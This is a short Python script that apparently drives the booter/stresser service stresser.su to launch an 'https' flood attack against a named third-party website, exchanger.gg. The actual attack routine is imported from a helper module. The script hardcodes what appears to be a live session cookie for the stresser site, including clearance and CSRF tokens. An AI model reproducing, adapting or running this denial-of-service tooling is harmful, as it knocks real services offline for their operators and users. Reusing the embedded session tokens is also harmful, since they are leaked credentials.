from helpers.attack import Attack

class otter: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def send_requests(self, website: str, method: str) -> bool:
        try:
            Attack.start(self, website, method)
        except:
            return False
        
if __name__ == "__main__":
    otter_object: object = otter(cookie="_ga=GA1.2.975047996.1682536721; _gid=GA1.2.1846016745.1682536721; UID=a92boiaa3vvhg6takcvoofb40p; crisp-client%2Fsession%2F282fce01-adbf-401a-aaa1-bcd8c73ed1ec=session_6ccbc350-93c5-4f84-bfdd-e8b9d2c34f4b; __RM=47c495a4edc9f35f354852c0e29322abrgh658a92boiaa3vvhg6takcvoofb40p6%242y%2410%24wiX52bYfW6OaovUMGubZ9OWw.rxRXLyBKruaG9yfZdSwhNKvor6He%2F%2F077378cd9e095158c6f39154f2dd122f; X-CSRF-TOKEN=%242y%2410%24z5kPJFwercBwS3.6vSP.V.4P.EjuKp68ABPIl6saG1in.iCT27unC; cf_chl_rc_m=1; cf_clearance=zRpEfpSkvQkL.sqNgP4S07dI5w5w6iwnkmVzj0PVSYs-1682598220-0-160")
    otter_object.send_requests(website="exchanger.gg", method="https")